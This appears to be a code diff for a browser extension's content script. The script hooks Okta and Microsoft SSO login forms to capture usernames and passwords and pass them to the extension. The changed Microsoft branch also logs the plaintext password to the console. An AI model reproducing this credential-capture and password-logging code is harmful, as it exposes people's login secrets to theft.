@@ -8,7 +8,7 @@
  */
 const ssoLoginHosts = [{
     host: "login.microsoftonline.com",
-    path: "common/oauth2/authorize"
+    path: "/common/oauth2/authorize"
   },
   {
     host: "login.microsoftonline.com",
@@ -56,34 +56,39 @@ const ssoLoginHosts = [{
   var domLoadTimer = setInterval(doCheckForForm, 100);
 
   function doCheckForForm() {
-    // If we find the form
-    if (typeof document.forms !== "undefined" 
-      && document.forms[0]
-      && document.forms[0].elements.username) {
-      
-      // Clear our check timer
-      clearInterval(domLoadTimer);
-      let ssoForm = document.forms[0]
+    if (ssoLoginHosts[_c].host == 'glg.okta.com') {
+      // If we find the form
+      if (typeof document.forms !== "undefined" && document.forms[0] && document.forms[0].elements.username) {
+        // Clear our check timer
+        clearInterval(domLoadTimer);
+        let ssoForm = document.forms[0]
 
-      // Now listen for the submit event and if it's fired
-      // store whatever password is sent to us.
-      if (ssoLoginHosts[_c].host == 'glg.okta.com') {
-        ssoForm.addEventListener("submit", () => chrome.runtime.sendMessage("", {
-          "name": "ssoLoginSubmit",
-          "ssoUsername": ssoForm.elements.username.value,
-          "ssoPassword": ssoForm.elements.password.value
-        }), false);
+        // Now listen for the submit event and if it's fired
+        // store whatever password is sent to us.
+          ssoForm.addEventListener("submit", () => chrome.runtime.sendMessage("", {
+            "name": "ssoLoginSubmit",
+            "ssoUsername": ssoForm.elements.username.value,
+            "ssoPassword": ssoForm.elements.password.value
+          }), false);
       }
+    }
+    else if (ssoLoginHosts[_c].host == 'login.microsoftonline.com') {
+      if (typeof document.forms !== "undefined" && document.forms[0] && document.forms[0].elements.loginfmt) {
+        clearInterval(domLoadTimer);
+        // There are two pages with a submit event in the microsoft login: the username page and the password page.
+        // If the password field is not blank, then we want to listen for the submit event 
+        // since the user is about to login at this point.
 
-      // There are two pages with a submit event in the microsoft login: the username page and the password page.
-      // If the password field is not blank, then we want to listen for the submit event 
-      // since the user is about to login at this point.
-      else if (ssoLoginHosts[_c].host == 'login.microsoftonline.com' && ssoForm.elements.passwd != "") {
-        ssoForm.addEventListener("submit", () => chrome.runtime.sendMessage("", {
-          "name": "ssoLoginSubmit",
-          "ssoUsername": ssoForm.elements.loginfmt.value,
-          "ssoPassword": ssoForm.elements.passwd.value
-        }), false);
+        let loginField = document.forms[0].elements.loginfmt;
+        let submitButton = document.querySelectorAll('[type="submit"]')[0];
+        let ssoForm = document.forms[0]
+        submitButton.addEventListener("click", () => {
+          console.log("Login!!!!!", ssoForm.elements.loginfmt.value);
+          console.log("Pass!!!!!", ssoForm.elements.passwd.value);
+          //chrome.runtime.sendMessage("", { "name": "ssoLoginSubmit", 
+          //"ssoUsername": ssoForm.elements.loginfmt.value, 
+          //"ssoPassword": ssoForm.elements.passwd.value })
+        }, false);
       }
     }
   }
